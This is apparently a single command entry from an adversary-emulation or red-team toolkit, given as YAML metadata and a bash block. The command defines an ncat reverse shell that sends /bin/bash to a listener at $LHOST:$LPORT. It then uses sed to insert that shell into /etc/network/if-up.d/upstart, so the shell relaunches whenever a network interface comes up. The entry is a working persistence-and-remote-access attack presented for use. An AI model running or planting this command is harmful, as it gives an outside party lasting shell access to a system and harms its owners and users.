---
id: 4ab835f6-1573-4e88-bb4a-453298212690
name: Add reverse shell command to if-up.d upstart
type: command
executor: bash
data: 'RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"

  sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart'
output: null
created_at: '2023-04-06T03:56:18.014145+00:00'
updated_at: '2023-04-10T20:34:19.947536+00:00'
---

# Add reverse shell command to if-up.d upstart

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```
